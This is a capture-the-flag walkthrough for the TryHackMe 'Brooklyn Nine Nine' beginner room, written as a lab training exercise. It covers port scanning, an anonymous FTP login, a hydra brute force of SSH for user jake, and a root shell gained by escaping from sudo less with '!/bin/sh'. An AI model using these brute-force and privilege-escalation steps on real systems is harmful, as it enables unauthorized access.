---
description: Walkthrough (Easy)
---

# Brooklyn Nine Nine 🟢

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box

[https://tryhackme.com/r/room/brooklynninenine](https://tryhackme.com/r/room/brooklynninenine)  &#x20;

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

### Nmap Scan ( Reconnaissance )

```bash
nmap -T4 -sVC 10.10.30.120 -oN nmap 
```

**Found:**

* Anonymous FTP login
* SSH port is open

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

#### FTP  login

```bash
 ftp 10.10.30.120
 name : anonymous
 password : < press enter >
```

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

* Found note\_to\_jake.txt&#x20;

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

* Found a username : jake&#x20;
* Now Brute SSH using hydra

***

#### SSH login ( jake )

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.30.120
```

\-l -> username\
\-P -> password file

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

* Found Password : 987654321

***

### Getting user.txt

```bash
ssh jake@10.10.30.120 
```

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

* Found 3 users amy, holt, jake
* user.txt was in holt Folder

***

### Getting root.txt

```bash
sudo -l 
```

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

* jake user can run less with noPassword as a root user
* So visit [**GtfoBins**](https://gtfobins.github.io/gtfobins/less/) and find sudo code for less.

```bash
sudo less /etc/profile
!/bin/sh
```

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

* add ' !/bin/sh ' at the end of file and press enter. Then you will be given root access

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
